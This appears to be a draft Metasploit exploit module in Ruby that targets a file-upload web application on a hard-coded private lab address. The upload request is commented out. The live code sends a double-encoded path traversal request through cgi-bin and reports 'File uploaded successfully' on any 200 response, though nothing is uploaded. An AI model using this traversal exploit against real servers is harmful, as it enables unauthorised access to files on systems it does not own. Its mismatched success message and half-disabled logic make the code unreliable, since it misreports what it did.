require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Exploit',
      'Description'    => 'Exploit description',
      'Author'         => 'Author name',
      'License'        => MSF_LICENSE,
      'Payload'        => { 'BadChars' => "\x00" },
      'DefaultOptions' => {
          'RPORT' => 80,
        },
      'Platform'       => 'win',
      'Targets'        => [
          ['Automatic', {}],
        ],
      'DisclosureDate' => '2021-09-01'
    ))

    register_options([
        OptString.new('TARGETURI', [true, 'The URI path of the file upload script', '/fileupload.php'])
        # OptString.new('FILEPATH', [true, 'The path to the file to upload', '/path/to/file']),
        # OptString.new('FILENAME', [true, 'The name to give the uploaded file', 'uploaded_file.txt']),
      ])
  end

  def exploit
    # print_status("Sending file #{datastore['FILEPATH']} to #{rhost}:#{rport}#{datastore['TARGETURI']}")
    begin
    #   res = send_request_cgi({
    #         'method'    => 'POST',
    #         'uri'       => normalize_uri(datastore['TARGETURI']),
    #         'ctype'     => 'multipart/form-data;',
    #         'vars_post' => {
    #             'file' => Rex::MIME::Message.new.add_part(
    #                 File.read('/path/to/file'), 
    #                 'application/octet-stream', 
    #                 nil, 
    #                 'form-data; name="file"; filename="file.txt"'
    #             ),
    #         }
    #     })

        res = send_request_cgi({
            'method'    => 'GET',
            'uri'       => "http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt"
        })

      if res.nil?
        print_error('No response from the server')
        return
      end

      if res.code != 200
        print_error("Unexpected HTTP response code: #{res.code}")
        return
      end

      print_good("File uploaded successfully")
    rescue ::Rex::ConnectionError => e
      print_error("Error connecting to the server: #{e.message}")
    end
  end

end